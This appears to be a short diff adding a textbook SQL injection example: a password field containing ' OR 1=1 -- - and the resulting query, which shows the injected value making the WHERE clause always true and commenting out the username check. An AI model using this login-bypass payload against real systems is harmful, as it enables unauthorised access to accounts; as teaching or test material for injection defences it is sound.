@@ -1,0 +1,3 @@
+username: f
+password: ' OR 1=1 -- -
+SQL query: SELECT id FROM users WHERE password = '' OR 1=1 -- -' AND username = 'f'
